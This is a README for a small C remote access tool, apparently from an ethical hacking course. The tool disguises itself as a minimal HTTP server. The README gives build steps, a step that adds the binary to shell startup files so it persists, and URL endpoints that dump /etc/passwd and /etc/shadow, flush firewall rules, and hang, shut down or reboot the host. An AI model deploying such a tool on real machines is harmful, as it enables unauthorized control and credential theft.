
# n00bRAT

v0.7

It's a tiny C program which emulates a bare minimum HTTP server for fingerprinting security scanners.
It let's one control the machine over this faked HTTPv0.1 protocol.

![image of Rat](docs/rat.png)

> This n00b server was created as RAT during college for Ethical Hacking course.
>
> What is it / Why it is / etc.
> Read [n00bRAT Report](./docs/n00bRAT_Report.pdf) in any PDF Reader for information


### HOW TO INSTALL

Method.1:
> (a.) Open a Command Shell
>
> (b.) Change Location to n00bRAT's Directory
>
> (c.) Execute following process:	`gcc -o http ABK_n00bRAT.c`

Method.2
> (a.) Open a Command Shell
>
> (b.) Change Location to n00bRAT's Directory
>
> (c.) Execute following process:	`make`



### HOW TO USE

Method.1:
> (a.) execute the binary "http" file created after Installing Process

Method#2:
> (a.) add the binary "http" file in listing of commands in StartUp Scripts
>
>       adding it to "~/.bash.profile" and "~/bash.rc" should be enough


http://server_ip:port/1
Hang The Machine: /0
显示 /etc/passwd 文件内容: /1
显示 /etc/shadow 文件内容: /2
显示 /etc/resolv.conf 文件内容: /3
显示进程列表: /4
清除所有防火墙规则: /5
显示所有网络接口信息: /6
显示系统编码的网络接口信息: /7
关闭系统: /8
重启系统: /9
---
